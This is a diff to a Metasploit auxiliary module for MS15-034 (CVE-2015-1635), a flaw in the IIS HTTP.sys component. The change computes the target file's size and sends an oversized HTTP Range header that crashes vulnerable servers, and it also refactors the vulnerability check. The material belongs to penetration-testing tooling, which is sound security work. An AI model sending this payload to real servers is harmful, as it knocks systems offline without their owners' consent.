@@ -37,7 +37,9 @@ class Metasploit3 < Msf::Auxiliary
           ['CVE', '2015-1635'],
           ['MSB', 'MS15-034'],
           ['URL', 'http://pastebin.com/ypURDPc4'],
-          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5150']
+          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5150'],
+          ['URL', 'https://community.qualys.com/blogs/securitylabs/2015/04/20/ms15-034-analyze-and-remote-detection'],
+          ['URL', 'http://www.securitysift.com/an-analysis-of-ms15-034/']
         ],
       'License'        => MSF_LICENSE
     ))
@@ -50,6 +52,10 @@ class Metasploit3 < Msf::Auxiliary
     deregister_options('RHOST')
   end
 
+  def upper_range
+    0xFFFFFFFFFFFFFFFF
+  end
+
   def run_host(ip)
     if check_host(ip) == Exploit::CheckCode::Vulnerable
       dos_host(ip)
@@ -58,7 +64,34 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
+  def get_file_size(ip)
+    @file_size ||= lambda {
+      file_size = -1
+      uri = normalize_uri(target_uri.path)
+      res = send_request_raw({'uri'=>uri})
+
+      unless res
+        vprint_error("#{ip}:#{rport} - Connection timed out")
+        return file_size
+      end
+
+      if res.code == 404
+        vprint_error("#{ip}:#{rport} - You got a 404. URI must be a valid resource.")
+        return file_size
+      end
+
+      file_size = res.body.length
+      vprint_status("#{ip}:#{rport} - File length: #{file_size} bytes")
+
+      return file_size
+    }.call
+  end
+
+
   def dos_host(ip)
+    file_size = get_file_size(ip)
+    lower_range = file_size - 2
+
     # In here we have to use Rex because if we dos it, it causes our module to hang too
     uri = normalize_uri(target_uri.path)
     begin
@@ -68,7 +101,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri' => uri,
         'method' => 'GET',
         'headers' => {
-          'Range' => 'bytes=18-18446744073709551615'
+          'Range' => "bytes=#{lower_range}-#{upper_range}"
         }
       })
       cli.send_request(req)
@@ -78,26 +111,16 @@ class Metasploit3 < Msf::Auxiliary
     print_status("#{ip}:#{rport} - DOS request sent")
   end
 
+
   def check_host(ip)
+    return Exploit::CheckCode::Unknown if get_file_size(ip) == -1
+
     uri = normalize_uri(target_uri.path)
-
-    res = send_request_raw({'uri'=>uri})
-
-    unless res
-      vprint_error("#{ip}:#{rport} - Connection timed out")
-      return Exploit::CheckCode::Unknown
-    end
-
-    if res.code == 404
-      vprint_error("#{ip}:#{rport} - You got a 404. URI must be a valid resource.")
-      return Exploit::CheckCode::Unknown
-    end
-
     res = send_request_raw({
       'uri' => uri,
       'method' => 'GET',
       'headers' => {
-        'Range' => 'bytes=0-18446744073709551615'
+        'Range' => "bytes=0-#{upper_range}"
       }
     })
     if res && res.body.include?('Requested Range Not Satisfiable')
